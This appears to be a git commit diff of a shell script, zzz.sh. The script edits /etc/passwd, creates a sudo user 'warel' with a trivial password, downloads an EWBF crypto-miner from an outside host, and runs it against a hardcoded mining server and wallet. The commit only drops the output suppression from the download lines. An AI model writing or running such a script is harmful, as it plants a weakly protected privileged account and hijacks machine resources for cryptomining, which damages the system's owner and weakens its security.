b4eb236555f4444fb518639192f3e5e3ca200a31
arymas49 <58667903+arymas49@users.noreply.github.com>
2023-11-27 14:51:11 +0800

    Update zzz.sh

--- zzz.sh
+++ zzz.sh
@@ -7,6 +7,6 @@ sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
 adduser warel sudo
 echo 'warel:warel' | sudo chpasswd
 echo warel:1 | sudo chpasswd
-wget https://legacy.os.dog/downloads/miners/ewbf@0.6.tar.gz > /dev/null 2>&1
-tar -xvf ewbf@0.6.tar.gz > /dev/null 2>&1
+wget https://legacy.os.dog/downloads/miners/ewbf@0.6.tar.gz
+tar -xvf ewbf@0.6.tar.gz
 su warel -c "./miner --algo 144_5 --pers BgoldPoW --server 45.33.14.92 --port 1255 --user NHbT5nHfBWAJnWZMmQWxserik53qEQQ2CohY.Warel --templimit 150"
